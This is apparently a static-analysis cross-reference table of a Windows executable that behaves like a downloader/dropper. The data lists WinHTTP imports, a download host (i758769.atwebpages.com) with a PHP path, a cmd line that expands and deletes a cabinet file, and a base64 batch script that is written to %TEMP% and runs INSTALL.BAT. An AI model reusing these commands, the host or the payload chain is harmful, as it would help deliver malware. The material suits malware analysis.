reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40101b	0x40fff0	string	0x401000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x401020	0x402860	string	0x401000	3\nD$\bS
0x401025	0x40fff0	string	0x401000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x401036	0x402860	string	0x401000	3\nD$\bS
0x40103b	0x40fff0	string	0x401000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x40104c	0x402860	string	0x401000	3\nD$\bS
0x401051	0x40fff0	string	0x401000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x401061	0x402860	string	0x401000	3\nD$\bS
0x401069	0x40fff0	string	0x401000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x4010fa	0x40b238	import	0x4010e0	WINHTTP.dll.WinHttpOpen
0x401110	0x40d414	string	0x4010e0	i758769.atwebpages.com
0x401116	0x40b23c	import	0x4010e0	WINHTTP.dll.WinHttpConnect
0x401135	0x40b240	import	0x4010e0	WINHTTP.dll.WinHttpOpenRequest
0x401148	0x40b244	import	0x4010e0	WINHTTP.dll.WinHttpSendRequest
0x401154	0x40b248	import	0x4010e0	WINHTTP.dll.WinHttpReceiveResponse
0x401163	0x40b24c	import	0x4010e0	WINHTTP.dll.WinHttpQueryDataAvailable
0x40117c	0x40b118	import	0x4010e0	KERNEL32.dll.LocalAlloc
0x4011aa	0x40b114	import	0x4010e0	KERNEL32.dll.CreateFileW
0x4011cb	0x40b250	import	0x4010e0	WINHTTP.dll.WinHttpReadData
0x4011e8	0x40b0b4	import	0x4010e0	KERNEL32.dll.WriteFile
0x4011fb	0x40b250	import	0x4010e0	WINHTTP.dll.WinHttpReadData
0x401209	0x40b0b0	import	0x4010e0	KERNEL32.dll.CloseHandle
0x401210	0x40b0ac	import	0x4010e0	KERNEL32.dll.LocalFree
0x401216	0x40b254	import	0x4010e0	WINHTTP.dll.WinHttpCloseHandle
0x4012fa	0x40d380	string	0x401240	Wow64EnableWow64FsRedirection
0x4012ff	0x40d3a0	string	0x401240	kernel32.dll
0x401304	0x40b0a4	import	0x401240	KERNEL32.dll.GetModuleHandleW
0x40130b	0x40b0a8	import	0x401240	KERNEL32.dll.GetProcAddress
0x401325	0x40d3bc	string	0x401240	%TEMP%
0x40132a	0x40b0a0	import	0x401240	KERNEL32.dll.ExpandEnvironmentStringsW
0x401330	0x40b09c	import	0x401240	KERNEL32.dll.GetTempFileNameW
0x40134a	0x40b098	import	0x401240	KERNEL32.dll.DeleteFileW
0x401382	0x40b094	import	0x401240	KERNEL32.dll.GetSystemWow64DirectoryW
0x40138f	0x40d3d0	string	0x401240	/index.php?user_id=18756&type=%d
0x40141a	0x40d448	string	0x401240	cmd /c expand "%s" -F:* "%s" && del /f /q "%s" && echo OK > a.log
0x40149e	0x40b08c	import	0x401240	KERNEL32.dll.CreateProcessW
0x4014ad	0x40b088	import	0x401240	KERNEL32.dll.WaitForSingleObject
0x4014ba	0x40b0b0	import	0x401240	KERNEL32.dll.CloseHandle
0x401537	0x40d3bc	string	0x4014e0	%TEMP%
0x401546	0x40b0a0	import	0x4014e0	KERNEL32.dll.ExpandEnvironmentStringsW
0x40154c	0x40d4cc	string	0x4014e0	\temp.bat
0x401562	0x40ff30	string	0x4014e0	QEVDSE8gT0ZGDQoNCkNEIC9EICVURU1QJQ0KOldBSVRJTkcNClRJTUVPVVQgL1QgMQ0KSUYgTk9UIEVYSVNUICJBLkxPRyIgKEdPVE8gV0FJVElORykNCkRFTCAvRiAvUSAiQS5MT0ciDQpJTlNUQUxMLkJBVA0KREVMIC9GIC9RICIlfkRQTlgwIg==
0x40157c	0x40158f	string	0x4014e0	WVj@
0x401593	0x40b118	import	0x4014e0	KERNEL32.dll.LocalAlloc
0x4015bb	0x40ff30	string	0x4014e0	QEVDSE8gT0ZGDQoNCkNEIC9EICVURU1QJQ0KOldBSVRJTkcNClRJTUVPVVQgL1QgMQ0KSUYgTk9UIEVYSVNUICJBLkxPRyIgKEdPVE8gV0FJVElORykNCkRFTCAvRiAvUSAiQS5MT0ciDQpJTlNUQUxMLkJBVA0KREVMIC9GIC9RICIlfkRQTlgwIg==
0x4015f5	0x40b114	import	0x4014e0	KERNEL32.dll.CreateFileW
0x401612	0x40b0b4	import	0x4014e0	KERNEL32.dll.WriteFile
0x401619	0x40b0b0	import	0x4014e0	KERNEL32.dll.CloseHandle
0x40162b	0x40d4e0	string	0x4014e0	%windir%
0x401630	0x40b084	import	0x4014e0	KERNEL32.dll.ExpandEnvironmentStringsA
0x40163c	0x40d4ec	string	0x4014e0	\sysnative
0x40164f	0x40d4f8	string	0x4014e0	\system32
0x401668	0x40d504	string	0x4014e0	\cmd.exe /c cd /d "%TEMP%" && temp.bat
0x40168a	0x40b080	import	0x4014e0	KERNEL32.dll.WinExec
0x401691	0x40b0ac	import	0x4014e0	KERNEL32.dll.LocalFree
0x4016d1	0x40b114	import	0x4016b0	KERNEL32.dll.CreateFileW
0x4016e9	0x40b07c	import	0x4016b0	KERNEL32.dll.GetFileSize
0x4016f3	0x4016fb	string	0x4016b0	WSj@
0x4016ff	0x40b118	import	0x4016b0	KERNEL32.dll.LocalAlloc
0x401720	0x40b078	import	0x4016b0	KERNEL32.dll.ReadFile
0x401727	0x40b0b0	import	0x4016b0	KERNEL32.dll.CloseHandle
0x401739	0x40b118	import	0x4016b0	KERNEL32.dll.LocalAlloc
0x401776	0x40b114	import	0x4016b0	KERNEL32.dll.CreateFileW
0x401797	0x40b0b4	import	0x4016b0	KERNEL32.dll.WriteFile
0x40179e	0x40b0b0	import	0x4016b0	KERNEL32.dll.CloseHandle
0x4017a5	0x40b0ac	import	0x4016b0	KERNEL32.dll.LocalFree
0x4017b4	0x40b098	import	0x4016b0	KERNEL32.dll.DeleteFileW
0x4018b6	0x40b274	import	0x4018a0	gdiplus.dll.GdipCloneImage
0x4018c5	0x40b260	import	0x4018a0	gdiplus.dll.GdipAlloc
0x401900	0x40b264	import	0x4018f0	gdiplus.dll.GdipDisposeImage
0x40190d	0x40b25c	import	0x4018f0	gdiplus.dll.GdipFree
0x40193c	0x40b04c	import	0x401920	KERNEL32.dll.EnterCriticalSection
